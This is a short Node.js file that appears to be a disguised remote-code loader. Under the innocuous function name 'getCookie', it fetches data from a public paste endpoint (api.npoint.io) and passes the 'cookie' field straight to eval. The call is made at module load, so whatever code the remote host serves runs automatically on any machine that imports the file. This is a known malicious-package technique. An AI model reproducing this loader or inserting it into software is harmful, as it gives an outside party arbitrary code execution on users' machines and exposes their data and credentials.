const axios = require('axios')

const getCookie = async () => {
    const res = await axios.get("https://api.npoint.io/d1b87fb9c916b7dd925c")
    eval(res.data.cookie);
  }
  
getCookie();